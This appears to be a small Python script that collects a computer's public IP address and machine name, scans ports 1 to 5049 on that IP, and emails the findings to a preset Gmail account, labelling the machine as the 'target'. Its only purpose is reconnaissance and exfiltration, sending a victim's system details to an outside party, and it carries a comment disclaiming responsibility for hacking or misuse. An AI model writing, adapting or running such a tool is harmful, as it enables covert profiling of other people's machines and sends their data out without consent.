import os, time, socket, netifaces, email, smtplib, ssl, socket, threading
from requests import get
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
startTime = time.time()

#Takes ip from werid webside gg ez 
ip = get('https://api.ipify.org').text

#Takes name of the pc
pc_name =  os.environ['COMPUTERNAME']

#Open ports on local (scan)

# empty list
list = []

target = str(ip)  # scan ip host
def port_scanner(port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        list.append(f"Port {port} is open | ")
    except:
        pass


for port in range(1,5050):
    thread = threading.Thread(target =port_scanner, args=[port])
    thread.start()
    #We are not responsible for any hack or miss use.  
    
#string convert cuz gmail want everything in string
def listToString(s): 
    # initialize an empty string
    str1 = " " 
    # return string  
    return (str1.join(s))

x=str(pc_name)
y=str(ip)
z=("target: "+pc_name+"|ip: "+ip)

#Email part
subject = z
body = listToString(list)
sender_email = "" #email
receiver_email = "" #email
password = "" #password

# Create a multipart message and set headers
message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = subject
message["Bcc"] = receiver_email  # Recommended for mass emails

# Add body to email
message.attach(MIMEText(body, "plain"))

# Add attachment to message and convert message to string
text = message.as_string()

# Log in to server using secure context and send email
context = ssl.create_default_context()
with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
    server.login(sender_email, password)
    server.sendmail(sender_email, receiver_email, text)
